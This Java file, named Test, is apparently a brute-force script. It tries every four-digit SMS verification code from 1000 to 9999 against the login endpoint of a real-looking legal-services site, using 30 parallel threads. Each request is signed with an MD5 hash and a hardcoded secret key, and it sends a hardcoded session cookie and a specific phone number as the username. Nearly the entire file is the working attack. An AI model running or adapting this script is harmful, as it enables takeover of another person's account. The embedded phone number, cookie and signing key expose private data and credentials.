package com.coody.test;

import java.net.MalformedURLException;
import java.text.MessageFormat;

import org.coody.framework.context.entity.HttpEntity;
import org.coody.framework.core.thread.SysThreadHandle;
import org.coody.framework.util.EncryptUtil;
import org.coody.framework.util.HttpUtil;

public class Test {

	static String cookie = "JSESSIONID=2DC7AE9BCFF6811A53AFB5C620C005D9; lid=10503; menuId=34";
	static String dataModule = "code={0}&systemName=PC&username=18975522303&";

	static Integer generalCode = 1000;

	static Integer maxCode = 9999;

	public static void main(String[] args) throws MalformedURLException {
		System.out.println(sign("code=1234&systemName=PC&username=18975522303&"));
		for(int i=0;i<30;i++){
			SysThreadHandle.sysThreadPool.execute(new Runnable() {
				@Override
				public void run() {
					testCodeThread();
				}
			});
		}
	}

	private static void testCodeThread() {
		Integer currentCode = 0;
		while (generalCode <= maxCode) {
			synchronized (Test.class) {
				currentCode = generalCode;
				generalCode++;
			}
			try {
				String data = MessageFormat.format(dataModule, currentCode.toString());
				data = sign(data);
				System.out.println(data);
				HttpEntity entity = HttpUtil.Post("http://lawyer.naoxin.com/pcapi/lawyer/PCSmsLogin.do", data, "utf-8",
						cookie);
				System.out.println(entity.getHtml());
				if (entity.getHtml().contains("\"code\":0")) {
					generalCode = maxCode + 1;
					System.err.println("验证码为:" + currentCode);
					break;
				}
				System.out.println("检查验证码:" + currentCode);
			} catch (Exception e) {
				// TODO: handle exception
			}
		}
	}

	private static String sign(String context) {
		String signStr = context + "key=9fl26o8v31fee3d3d5n1aeocxinc2fc1811a887bf";
		String sign = EncryptUtil.md5Code(signStr);
		return context + "sign=" + sign;
	}

}
